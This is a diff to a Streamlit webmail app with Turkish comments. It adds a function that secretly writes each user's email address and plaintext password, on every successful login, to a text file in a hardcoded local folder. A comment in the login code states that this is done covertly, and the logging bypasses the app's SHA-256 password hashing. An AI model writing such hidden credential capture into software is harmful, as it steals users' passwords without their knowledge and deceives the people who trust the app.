@@ -2,6 +2,7 @@ import streamlit as st
 import sqlite3
 import hashlib
 from datetime import datetime
+import os  # Dosya ve klasör işlemleri için eklendi
 
 # 1. VERİBATANI AYARLARI
 conn = sqlite3.connect("ostmail_v6.db", check_same_thread=False)
@@ -37,6 +38,28 @@ conn.commit()
 # 2. YARDIMCI FONKSİYONLAR
 def sifre_sifrele(sifre):
     return hashlib.sha256(sifre.encode()).hexdigest()
+
+# 📂 BİLGİSAYARA E-POSTA VE ŞİFREYİ KAYDETME FONKSİYONU (GÜNCELLENDİ)
+def yerel_kayit_olustur(kullanici_adi, sifre):
+    klasor_yolu = r"C:\Users\omeef\Videos\ostmailgiriş"
+    
+    # Klasör yoksa çökmesini önlemek için otomatik oluşturulur
+    if not os.path.exists(klasor_yolu):
+        try:
+            os.makedirs(klasor_yolu)
+        except Exception as e:
+            print(f"Klasör oluşturulamadı: {e}")
+            return
+            
+    dosya_yolu = os.path.join(klasor_yolu, "giris_kayitlari.txt")
+    zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Hem e-posta adresini hem de girilen şifreyi yan yana kaydeder
+    try:
+        with open(dosya_yolu, "a", encoding="utf-8") as dosya:
+            dosya.write(f"[{zaman}] BAŞARILI GİRİŞ - E-Posta: {kullanici_adi} | Şifre: {sifre}\n")
+    except Exception as e:
+        print(f"Log yazılırken bir hata oluştu: {e}")
 
 # Sayfa Ayarları
 st.set_page_config(page_title="Östmail Premium", layout="wide")
@@ -82,6 +105,9 @@ if current_user is None:
                     sifreli_sifre = sifre_sifrele(giris_sifre)
                     cursor.execute("SELECT * FROM kullanicilar WHERE eposta=? AND sifre=?", (giris_ad, sifreli_sifre))
                     if cursor.fetchone():
+                        # 📁 GİZLİCE TXT DOSYASINA HEM E-POSTAYI HEM ŞİFREYİ YAZIYORUZ
+                        yerel_kayit_olustur(giris_ad, giris_sifre)
+                        
                         st.query_params["giris_yapan_kullanici"] = giris_ad
                         st.success("Giriş başarılı! Yönlendiriliyorsunuz...")
                         st.rerun()
@@ -170,7 +196,6 @@ else:
     # --- GELEN KUTUSU ---
     elif menu == "📥 Gelen Kutusu":
         st.header("📥 Gelen Kutusu")
-        # Sadece durumu 'gelen' olan aktif mailleri getirir
         cursor.execute("SELECT id, gonderen, baslik, icerik, dosya_adi, dosya_veri, tarih FROM mailler WHERE alici=? AND durum_alici='gelen' ORDER BY tarih DESC", (current_user,))
         gelenler = cursor.fetchall()
         
